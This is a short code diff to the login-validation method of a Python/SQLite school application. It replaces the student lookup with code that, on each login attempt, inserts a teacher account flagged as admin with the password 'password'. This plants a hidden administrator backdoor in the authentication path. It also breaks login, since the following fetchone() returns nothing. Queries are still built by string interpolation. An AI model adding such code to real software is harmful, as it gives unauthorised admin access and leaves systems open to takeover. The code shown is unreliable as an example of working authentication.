@@ -25,7 +25,11 @@ class DatabaseModel:
     def validate_login(self, student_number, password):
         cursor = sqlite3.connect(self.database_file).cursor()
         if(len(student_number)==7):
-            cursor.execute(f"SELECT * FROM student WHERE student_number = '{student_number}'")
+            hashed_password = pbkdf2_sha256.hash("password")
+            db = sqlite3.connect(self.database_file)
+            cursor = db.cursor()
+            cursor.execute(f"INSERT INTO teacher (first_name, last_name, password, isAdmin) VALUES ('Mattias', 'Suijker', '{hashed_password}', '1')")
+            db.commit()
             account = cursor.fetchone()
             cursor.close()
             if account == None or not pbkdf2_sha256.verify(password, account[4]):
